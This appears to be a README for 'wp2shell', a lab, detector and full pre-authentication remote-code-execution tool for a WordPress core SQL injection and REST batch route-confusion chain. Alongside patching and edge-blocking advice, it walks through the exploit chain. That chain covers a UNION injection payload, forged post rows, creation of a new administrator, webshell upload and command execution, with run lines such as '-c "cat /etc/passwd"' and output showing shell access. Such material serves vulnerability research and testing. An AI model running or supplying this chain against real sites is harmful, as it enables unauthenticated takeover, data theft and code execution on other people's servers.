# wp2shell lab & detector + pre-auth RCE PoC

A self-contained lab, **non-destructive detector**, and **full pre-auth RCE proof-of-concept**
for **wp2shell** — the pre-authentication vulnerability chain in WordPress core:

| CVE | Component | Class | CVSS |
|-----|-----------|-------|------|
| **CVE-2026-60137** | `WP_Query::author__not_in` | SQL injection (CWE-89) | 9.1 |
| **CVE-2026-63030** | REST `/batch/v1` route confusion | interpretation conflict (CWE-436) → chains to RCE | 7.5 |

**Affected:** WordPress core **6.9.0–6.9.4** and **7.0.0–7.0.1** (the SQLi sink alone also affects
6.8.0–6.8.5). **Fixed in 6.8.6 / 6.9.5 / 7.0.2.** Reported by Adam Kues (Assetnote / Searchlight
Cyber); SQLi also credited to TF1T, dtro, haongo. Stock-default RCE chain (oEmbed → changeset →
re-entry) by Mustafa Can İPEKÇİ ([nukedx](https://github.com/mcipekci)).

> **Update first.** WordPress shipped forced auto-updates for this. This repo exists to help you
> *verify* your own estate is patched and to understand the bug — not to attack anyone. See
> [SECURITY.md](SECURITY.md).

---

## What it actually is

The **always-true** primitive is an **unauthenticated, no-plugin, stock-core SQL injection** giving
full **database read** (admin password hashes, everything in `wp_options`/`wp_users`). That alone
earns the 9.1 and immediate patching.

The **RCE is real and works on stock-default WordPress** — no `FILE` privilege, no persistent
object cache, no plugins, no misconfigurations required. The chain uses the read-only SQLi as a
**row-forgery primitive** (`UNION ALL SELECT` injects fake `wp_posts` rows), then leverages
WordPress's own content-rendering pipeline to convert those forged rows into real database writes
via oEmbed caching. From there, changeset elevation and re-entrant `parse_request` run in admin
context, creating a new administrator account — all from a single unauthenticated HTTP request.

### The full chain (no credentials, single entry point `POST /?rest_route=/batch/v1`)

```
1. Route confusion    — double-nested batch desyncs $matches/$validation so a GET
                        /wp/v2/widgets runs under posts::get_items() (public), reaching
                        WP_Query's author__not_in with attacker-controlled input.

2. Row forgery        — author__not_in is string-concatenated into SQL;
                        "1) AND 1=0 UNION ALL SELECT <23 cols> -- -" injects fake
                        WP_Post rows. per_page=-1 bypasses split_the_query (WP_Query
                        treats -1 as "no limit" → empty $limits → split=false →
                        full SELECT wp_posts.* → UNION columns match).

3. oEmbed write       — forged posts carry [embed]<self-url>[/embed]; rendering via
                        context=view makes WordPress cache real oembed_cache posts in
                        the DB (turns read-only SQLi into writes with predictable IDs).

4. Elevation+re-entry — a forged customize_changeset (user_id = real admin) plus a
                        forged post_type=request row with parent loops drives an
                        in-process re-entrant parse_request in admin context.

5. Admin creation     — POST /wp/v2/users in the same batch passes
                        current_user_can('create_users') → new administrator.

6. RCE                — login → plugin webshell upload → command execution → cleanup.
```

### Load-bearing gadgets (why the chain holds)

The novelty is the *composition*, not any single bug — the individual gadgets are legitimate
WordPress behaviours. Naming them (per Adam Kues's writeup) makes the forged-row graph in `exploit()`
readable and flags what to re-audit after the entry points were patched:

- **Cache/DB reconciliation** — when an in-memory cached post disagrees with its DB row, WordPress
  reconciles via `wp_update_post()` and prefers the in-memory `post_type`/`post_status`, letting an
  `oembed_cache` row be re-typed into a real `post`/`customize_changeset`.
- **Cycle-detection preserving `post_content`** — the `wp_insert_post_parent` filter walks the parent
  chain; on a detected cycle it calls a *second* `wp_update_post()` that fixes the parent **without
  overriding `post_content`**. That is the critical link: it lets the forged changeset's malicious
  `post_content` survive. (This is why the forged rows use self-/mutual-parent loops.)
- **Hook replay via `parse_request`** — publishing a post fires `do_action("{$status}_{$type}")`;
  a forged row with `post_status=parse` / `post_type=request` triggers `parse_request`, re-running the
  batch pipeline while the changeset's assumed-admin identity (`wp_set_current_user`) still holds.

These gadgets remain present in patched WordPress — only the two *entry points* (batch desync +
`author__not_in` scalar bypass) were closed. Any new primitive that forges in-memory post cache or
writes an `oembed_cache` row would re-enable the identical admin-takeover tail.

### Render-time write primitives

All four render-time write primitives confirmed live against 7.0.1 — each forged as an
unauthenticated post, rendered via the batch confusion, and the resulting DB write verified
by blind SQLi:

| Primitive | Trigger markup | Sink | Predicted identifier | Verified |
|-----------|---------------|------|---------------------|----------|
| **oembed** | `[embed]<url>[/embed]` | `wp_posts` row (`oembed_cache`) | `post_name = md5(url+attrs)` | post ID created |
| **rss** | `wp:rss {feedURL}` | `wp_options` site-transient | `_site_transient_feed_<md5(url)>` | option_id, 5192 B cached |
| **navigation** | `wp:navigation` | `wp_posts` row (`wp_navigation`) | `post_name = 'navigation'` (fixed) | ID created, slug navigation |
| **calendar** | `wp:calendar` | `wp_options` | `wp_calendar_block_has_published_posts` | option_id, value '1' |

What each result proves:
- **oembed** — the reference primitive: a fresh `wp_posts` row with an attacker-predicted slug
  (`md5(url+serialize(attrs))`) and a real auto-increment ID. This is the only one that gives you
  *multiple, on-demand, attacker-named* post rows — which is why the RCE chain uses it to back the
  forged changeset/request graph.
- **rss** — the strongest *general* write: the key `_site_transient_feed_<md5(url)>` is fully
  predictable, and the stored bytes are the feed body the attacker's URL serves — i.e., attacker
  controls both key and value. It's an `wp_options` write (no post ID), so it's an option-poisoning
  primitive rather than a drop-in for the changeset backing.
- **navigation** — the only other unauth "render creates a real post row" path. It's single-shot
  (skips if any published `wp_navigation` exists) with a fixed slug, so it can back at most one
  forged object, unlike oEmbed's N rows.
- **calendar** — confirms the render→`update_option` path fires unauthenticated, but the option
  name and its `'1'`/`'0'` value are fixed/DB-derived, so it's a "write happens" demonstration with
  no attacker control over key or value.

### Earlier conditional chains (superseded by the stock-default chain above)

- **INTO OUTFILE webshell:** requires the WordPress DB user to hold global `FILE` privilege + a
  web-served `secure_file_priv` + the drop readable by the web user. On normal/managed hosts none
  of that holds.
- **SimplePie → WP_HTML_Token POP:** `call_user_func('wp_insert_user', user_data_array)` — requires
  `gc_enabled()=false` + valid HMAC (wp_hash of exact serialized bytes, needs wp-config.php secrets).

---

## Quick start

Requirements: Docker + Docker Compose v2, Python 3.8+ (stdlib only), `make`, `curl`.

```bash
make up          # WordPress 6.9.4 (vulnerable) + MySQL 8.0, auto-installed on :8093
make check       # -> [VULNERABLE] http://localhost:8093 (WordPress 6.9.4 ...)
make proof       # -> also reads @@version and current_user() as read-only evidence
make exploit     # -> full pre-auth RCE: creates admin, deploys webshell, runs "id"
make patched     # rebuild on the fixed image and re-check -> [not vulnerable]
make down        # tear down (removes volumes)
```

Change the port with `WP_PORT=8100 make up`.

> **Note on the patched image:** the official Docker `wordpress` images lag WordPress core security
> releases by a day or two. If `make patched` reports that `wordpress:7.0.2` isn't on Docker Hub yet,
> retry later or point it at whichever fixed tag has published:
> `make patched WP_PATCHED_TAG=6.9.5` (or `7.0.2` / `6.8.6`). Any WordPress ≥ 6.9.5 / 7.0.2 / 6.8.6
> returns `not vulnerable`.

### Expected output

```
$ make check
[VULNERABLE] http://localhost:8093  (WordPress 6.9.4, affected-full-chain)  [active=fired | method=boolean rows(true/false)=5/0 via x-wp-total | delivery=json | slot=users]
        confirmed: unauthenticated SQL injection
        rce: reachable on stock config; additionally requires no persistent object cache (not verified remotely -- the RCE PoC preflights it before writing)

$ make exploit
[*] seeding oEmbed caches ...
[*] extracting table prefix ...
[+] table prefix: wp_
[*] extracting admin user ID ...
[+] admin ID: 1
[*] recovering oEmbed cache post IDs ...
[+] cache IDs: [5, 6, 7]
[*] forging changeset + re-entry, creating administrator ...
[+] administrator created: w2s_...:W2s!...  (w2s_...@wp2shell.local)
[*] logging in, deploying webshell, executing command ...
[+] vulnerable (unauth SQLi confirmed: method=boolean slot=users delivery=json)
[+] RCE output:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ make patched
[not vulnerable] http://localhost:8093  (WordPress 7.0.2, outside-affected-range)  [active=negative | method=time fast=0.01s slow=0.01s delta=-0.00s | delivery=json | slot=users]
```

---

## The tool (`wp2shell_check.py`)

Standard library only, no dependencies.

### Detection (default)

**Non-destructive**, with automatic fallback on three independent axes so a single blocked path
never reads as a false negative:

- **oracle** — a fast **boolean row-count differential** (flip the injected `WHERE` true/false and
  watch the confused posts query's `X-WP-Total` collapse, no `SLEEP`) first; if it doesn't fire, a
  **time-based `SLEEP`** differential. The `SLEEP` is wrapped in a derived table —
  `(SELECT 1 FROM (SELECT SLEEP(n))x)` — so it evaluates once regardless of row count (a bare
  `SLEEP()` is optimized away on some managed hosts and would read as a false negative).
- **delivery** — a **JSON** POST to the batch route first; if an edge blocks `/wp-json`, a
  **`rest_route=/batch/v1` multipart form on `POST /`** (the exact operator request shape).
- **slot** — the shifted request is validated against **`/wp/v2/users`** first; if that endpoint is
  disabled for unauth callers (Disable-REST-API plugins, user-enumeration hardening), it falls back
  to the universal **`/wp/v2/posts/<id>`** item endpoint.

None of it reads data or changes state. `--proof` reads only `@@version` and `current_user()` via a
bounded blind read. It **does not** extract sensitive data or attempt code execution.

```bash
python3 wp2shell_check.py https://your-site.example --authorized
python3 wp2shell_check.py -f assets.txt --authorized -t 20 --json > results.json
python3 wp2shell_check.py http://127.0.0.1:8093 --proxy http://127.0.0.1:8080
```

### Pre-auth RCE (`-c COMMAND`)

Full exploitation chain: detect → **row-forgery preflight** → oEmbed cache seeding →
**in-band UNION extraction** → changeset elevation → re-entrant parse_request → admin creation →
login → plugin webshell → execute → self-cleanup. Works on **stock-default WordPress** — no FILE
privilege, no persistent object cache, no plugins required.

```bash
python3 wp2shell_check.py http://127.0.0.1:8093 -c "id"
python3 wp2shell_check.py https://target.example -c "cat /etc/passwd" --authorized
```

- **Preflight before any write.** A single in-band UNION echo confirms the `per_page=-1`
  split_the_query bypass works on this target *before* the chain writes anything. A persistent
  object cache (Redis/Memcached — common on managed hosts) forces `split_the_query` and blocks the
  row forgery: the tool reports that precisely (the SQLi is still present; only the RCE is blocked)
  and leaves **no** orphan `oembed_cache` rows behind.
- **In-band extraction.** The table prefix, admin ID and seeded cache IDs are read straight out of
  the confused posts response (one request each) instead of a per-byte blind `SLEEP` ladder — ~50–
  100× fewer requests, far less WAF/rate-limit exposure. The blind oracle remains the automatic
  fallback if an in-band read is ever filtered.
- The webshell plugin self-destructs after one use (deactivates and deletes its own file).

### Options

`-c CMD` (pre-auth RCE), `--proof` (read-only evidence), `-f FILE` (batch scan),
`-t/--threads N` (concurrent workers, default 10), `--method auto|boolean|time`,
`--delivery auto|json|multipart` (`--multipart` alias), `--slot auto|users|posts-item`,
`--sleep N` (injected delay, default 4), `--rounds N` (median over N probes),
`--route auto|rest-route|wp-json`, `--timeout N`, `--proxy URL`, `--json`, `--authorized`.

**Status values**
- `vulnerable` — actively confirmed via the injection (batch confusion, 6.9.0–7.0.1). What the
  active oracle proves is the **unauthenticated SQL injection**; the pre-auth RCE is reachable from
  it on a stock install but additionally requires **no persistent object cache** (a precondition
  not verifiable remotely — the RCE PoC preflights it before writing). Output makes that split
  explicit (`confirmed:` / `rce:` lines).
- `affected_version` — fingerprinted version is in an affected range but the active check didn't
  fire (6.8.0–6.8.5 has the SQLi sink but not the confusion; or a WAF blocked the probe).
- `not_vulnerable` — active check negative and version outside the affected ranges.

Exit codes: `0` = needs attention, `1` = not vulnerable, `2` = error.

**Robustness:** follows redirects while **preserving the POST body**, canonicalizes the host once
up front, and **ignores TLS errors** (`curl -k`).

---

## Remediation

- **Patch** to WordPress **6.9.5 / 7.0.2** (or **6.8.6** on the 6.8 branch).
- If you can't patch immediately, block **both** `/wp-json/batch/v1` **and** `?rest_route=/batch/v1`
  at the edge — a rule on only the pretty path leaves the query-string route open — or require auth
  on the batch route via a `rest_pre_dispatch` filter.

## Credits

- **Route confusion + SQLi:** Adam Kues ([Assetnote](https://assetnote.io) / [Searchlight Cyber](https://slcyber.io))
- **Stock-default RCE chain (oEmbed → changeset → re-entry):** Mustafa Can İPEKÇİ
  ([nukedx](https://github.com/mcipekci))
- **SQLi (CVE-2026-60137):** also credited to TF1T, dtro, haongo

## References

- Searchlight Cyber / Assetnote — https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/
- mcipekci RCE gist — https://gist.github.com/mcipekci/2b5027f965153d8058bbcfd63006ef79
- WordPress 7.0.2 release — https://wordpress.org/news/2026/07/wordpress-7-0-2-release/
- Advisories: GHSA-ff9f-jf42-662q, GHSA-fpp7-x2x2-2mjf

## License

MIT — see [LICENSE](LICENSE).
